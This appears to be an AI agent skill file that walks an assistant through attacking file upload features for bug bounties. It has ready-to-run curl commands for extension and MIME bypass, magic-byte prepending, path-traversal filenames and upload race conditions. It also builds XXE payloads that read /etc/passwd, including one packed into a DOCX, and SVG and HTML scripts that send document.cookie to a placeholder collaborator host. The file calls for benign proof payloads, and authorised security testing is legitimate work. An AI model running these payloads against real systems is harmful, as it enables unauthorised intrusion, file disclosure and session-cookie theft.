---
name: file-upload-hunter
description: Systematically test file upload functionality for unrestricted upload, extension bypass, MIME type confusion, path traversal, stored XSS via SVG/HTML upload, XXE via XML uploads, and server-side execution. Use this skill whenever a target has file upload functionality. Trigger on phrases like "test file upload", "file upload vulnerabilities", "upload bypass", "test this upload form", or when recon reveals /upload, /import, /attachment, /avatar, /media, /document endpoints or multipart/form-data requests in API surface output.
---

# File Upload Hunter Skill

You are testing file upload functionality. File upload vulnerabilities range from informational (content-type accepted without execution) to Critical (server-side code execution via uploaded webshell). The attack surface varies significantly based on backend language, web server, storage location, and whether uploaded files are served back to users — understanding these factors before testing determines which attacks are applicable.

**Prime rule:** Never upload actual webshells or malicious executables to production. Use benign payloads that demonstrate the bypass without causing harm.

---

## Phase 1 — Upload Surface Mapping

### Step 1.1 — Identify Upload Endpoints

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/uploads

# Pull upload-related endpoints from recon
grep -iE '(upload|import|attach|avatar|photo|image|document|media|file|asset|blob|storage|cdn)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/js/endpoints.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/uploads/endpoints.txt

echo "[*] Upload-related endpoints:"
cat $TARGET_DIR/recon/uploads/endpoints.txt
```

### Step 1.2 — Characterize Each Upload Endpoint

For each upload endpoint, manually determine:

| Property | How to determine |
|---|---|
| Accepted file types | Try uploading `.jpg`, `.pdf`, `.txt` and observe responses |
| Client-side restriction | Inspect HTML `accept=` attribute and any JS validation |
| Storage location | Is the uploaded file served back? What URL path? |
| Execution context | Same origin as app, CDN/S3, separate domain? |
| Auth required | Can files be uploaded unauthenticated? |
| File size limit | Try progressively larger files |

Save characterization:
```bash
cat > $TARGET_DIR/recon/uploads/characterization.txt << 'EOF'
# Upload Endpoint Characterization
# endpoint | accepted-types | storage | served-back | auth-required
EOF
```

---

## Phase 2 — Extension and MIME Bypass

### Step 2.1 — Baseline Upload

```bash
UPLOAD_URL="[upload endpoint]"
SESSION_COOKIE="[auth cookie]"

# Upload a legitimate JPEG first to understand success response
cat > /tmp/test.jpg << 'EOF'
�JFIF�������
EOF

curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/test.jpg;type=image/jpeg" \
  -w "\n[%{http_code}]" | python3 -m json.tool 2>/dev/null
```

Note the success response structure — especially the returned URL or file path of the uploaded file.

### Step 2.2 — Extension Bypass Matrix

Create test files for each bypass category:

```bash
mkdir -p /tmp/upload-tests

# PHP variants
for EXT in php php2 php3 php4 php5 php6 php7 phtml phar php.jpg php%00.jpg; do
  echo '<?php echo "upload-test-".phpversion(); ?>' > "/tmp/upload-tests/test.$EXT"
done

# ASP/ASPX variants
for EXT in asp aspx asa asax ascx ashx asmx cer; do
  echo '<%response.write("upload-test-")%>' > "/tmp/upload-tests/test.$EXT"
done

# JSP variants
for EXT in jsp jspx jspf; do
  echo '<%= "upload-test" %>' > "/tmp/upload-tests/test.$EXT"
done

# XML/SVG for XXE and XSS
cat > /tmp/upload-tests/test.svg << 'SVGEOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
  <script>document.location='https://[collaborator]/?c='+document.cookie</script>
</svg>
SVGEOF

# HTML for stored XSS
cat > /tmp/upload-tests/test.html << 'HTMLEOF'
<html><body>
<script>document.location='https://[collaborator]/?c='+document.cookie</script>
</body></html>
HTMLEOF

# XML for XXE
cat > /tmp/upload-tests/test.xml << 'XMLEOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
XMLEOF

echo "[*] Test files created in /tmp/upload-tests/"
ls /tmp/upload-tests/
```

### Step 2.3 — MIME Type Confusion Tests

```bash
# Test server-side extension check vs MIME type mismatch
for FILE in /tmp/upload-tests/test.php /tmp/upload-tests/test.phtml; do
  EXT=$(basename $FILE | cut -d. -f2-)
  
  # Method 1: Correct MIME for the malicious extension
  echo "--- $EXT with application/octet-stream ---"
  curl -sk -X POST "$UPLOAD_URL" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@$FILE;type=application/octet-stream" \
    -w "[%{http_code}]" | head -5

  # Method 2: Legitimate MIME with malicious extension
  echo "--- $EXT with image/jpeg ---"
  curl -sk -X POST "$UPLOAD_URL" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@$FILE;type=image/jpeg" \
    -w "[%{http_code}]" | head -5
done
```

### Step 2.4 — Magic Byte Prepend

Prepend legitimate magic bytes to a PHP file to bypass content-type detection:

```bash
# JPEG magic bytes + PHP payload
python3 -c "
with open('/tmp/upload-tests/jpeg-php.php', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG magic bytes
    f.write(b'<?php echo \"upload-test-\".phpversion(); ?>')
"

curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/upload-tests/jpeg-php.php;type=image/jpeg" \
  -w "[%{http_code}]" | head -5

# PNG magic bytes + PHP
python3 -c "
with open('/tmp/upload-tests/png-php.php', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n')  # PNG magic bytes
    f.write(b'<?php echo \"upload-test-\".phpversion(); ?>')
"
```

---

## Phase 3 — Path Traversal and Storage Attacks

### Step 3.1 — Filename Path Traversal

```bash
# Test if filenames with traversal sequences are preserved server-side
TRAVERSAL_NAMES=(
  "../test.php"
  "../../test.php"
  "..%2ftest.php"
  "..%252ftest.php"
  "%2e%2e%2ftest.php"
  "....//test.php"
  "test.php%00.jpg"  # Null byte (old PHP)
)

for NAME in "${TRAVERSAL_NAMES[@]}"; do
  RESULT=$(curl -sk -X POST "$UPLOAD_URL" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@/tmp/upload-tests/test.php;filename=$NAME;type=image/jpeg" \
    -w "[%{http_code}]" --max-time 10)
  echo "[$NAME] $RESULT"
done
```

### Step 3.2 — Upload Location and Direct Access

If uploads are accepted, determine where files are served and whether they execute:

```bash
# Upload a benign probe file
echo 'upload-probe-test' > /tmp/probe.txt
RESPONSE=$(curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/probe.txt;type=text/plain" \
  | python3 -m json.tool 2>/dev/null)

echo "$RESPONSE"

# Extract file URL from response
FILE_URL=$(echo $RESPONSE | python3 -c \
  "import sys,json; d=json.loads(sys.stdin.read()); \
  # adjust key name for this target
  print(d.get('url', d.get('path', d.get('file_url', d.get('data', {}).get('url', '')))))" 2>/dev/null)

echo "Uploaded file URL: $FILE_URL"

# Retrieve the file and check if content is intact
if [ -n "$FILE_URL" ]; then
  curl -sk "$FILE_URL" | head -20
  echo "Content-Type: $(curl -sk -I \"$FILE_URL\" | grep -i content-type)"
fi
```

**Critical check:** If a `.php` file was accepted and served back, try accessing it:
```bash
# Replace extension in FILE_URL if needed
PHP_URL=$(echo $FILE_URL | sed 's/\.txt/.php/')
curl -sk "$PHP_URL" | head -10
# If phpversion() output is returned — RCE confirmed
```

---

## Phase 4 — Content-Based Attacks

### Step 4.1 — SVG Stored XSS

```bash
# Upload SVG with XSS payload
curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/upload-tests/test.svg;type=image/svg+xml" \
  -w "\n[%{http_code}]" | head -10

# If upload succeeds, fetch the SVG URL and check Content-Type
# If Content-Type is image/svg+xml and file is served inline:
# XSS executes when victim views the image URL directly
```

Note: SVG XSS only executes if:
1. The SVG is served with `Content-Type: image/svg+xml` (not `application/octet-stream`)
2. The SVG is rendered inline in the browser (not downloaded)
3. The SVG is on the same origin as the application (not a CDN domain)

### Step 4.2 — XML/Office XXE

```bash
# Upload XML with XXE payload
curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/upload-tests/test.xml;type=application/xml" \
  -w "\n[%{http_code}]" | head -10

# If the app parses and renders XML content server-side,
# the XXE payload will attempt to read /etc/passwd
# Use an out-of-band Burp Collaborator payload if no direct output

# DOCX/XLSX also contain XML — worth testing if office formats are accepted
python3 -c "
import zipfile, io
malicious_xml = b'''<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>'''
z = io.BytesIO()
with zipfile.ZipFile(z, 'w') as zf:
    zf.writestr('word/document.xml', malicious_xml)
    zf.writestr('[Content_Types].xml', '<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>')
open('/tmp/upload-tests/xxe.docx', 'wb').write(z.getvalue())
print('Created /tmp/upload-tests/xxe.docx')
"
```

### Step 4.3 — HTML Upload for Phishing / Stored XSS

```bash
# Upload HTML file
curl -sk -X POST "$UPLOAD_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/upload-tests/test.html;type=text/html" \
  -w "\n[%{http_code}]" | head -10

# If HTML is served with Content-Type: text/html on same origin—
# stored XSS via direct link to uploaded file
```

---

## Phase 5 — Race Condition on Upload Processing

Some upload pipelines validate files asynchronously: accept the upload, queue processing, validate, then move to final storage. There is a race window between acceptance and validation:

```bash
# Upload a PHP file and immediately try to access it before processing removes it
for i in $(seq 1 20); do
  # Launch upload in background
  curl -sk -X POST "$UPLOAD_URL" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@/tmp/upload-tests/test.php;type=image/jpeg" \
    -o /tmp/upload-race-$i.json &
  
  # Immediately try to fetch a predicted URL
  # (requires knowing the URL pattern from Step 3.2)
  curl -sk "$PREDICTED_URL" -o /tmp/race-fetch-$i.txt &
done
wait

grep -l 'upload-test' /tmp/race-fetch-*.txt 2>/dev/null && \
  echo "[!] Race condition window exists — file accessible before validation"
```

---

## Output Summary

| File | Contents |
|---|---|
| `endpoints.txt` | All upload-related endpoints |
| `characterization.txt` | Per-endpoint upload properties |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Server-side code execution (RCE via webshell) | Critical |
| Unrestricted upload to web root (potential RCE) | Critical |
| XXE via uploaded XML/DOCX with file read | High |
| SVG XSS on same origin | High |
| Path traversal via filename (write outside upload dir) | High |
| HTML upload with stored XSS on same origin | High |
| Upload race condition allowing pre-validation access | High |
| SVG XSS on CDN subdomain (no cookie access) | Medium |
| Unauthenticated file upload (non-executable) | Medium |
| Extension bypass accepted but file not executed | Low–Medium |
| Uploaded filename reflected in response (XSS vector) | Low–Medium |

---

## Guiding Principles

- **Never upload actual malware or working webshells.** Use `<?php echo "upload-test-".phpversion(); ?>` as the payload. It proves execution without providing a persistent backdoor.
- **Execution requires both upload AND access.** A PHP file that uploads but is stored in S3 and never executed by the PHP interpreter is not an RCE. Confirm the file is served through the web server before claiming execution.
- **SVG XSS is only impactful on same origin.** If uploads go to a CDN subdomain (e.g. assets.target.com vs target.com), there is no cookie access. Confirm the origin before escalating.
- **Extension accepted ≠ extension executed.** Test whether the uploaded file is actually processed as code. "PHP file uploaded successfully" is not a finding without confirmed execution.
- **Null byte and double extension bypasses are largely patched in modern PHP.** Try them but don't expect results on PHP 7+. Focus on MIME confusion, magic bytes, and `.phtml`/`.phar` on PHP targets.
- **Run /triager before submitting.** Upload findings without execution confirmation will be downgraded. Always include the fetched response from the uploaded file URL.
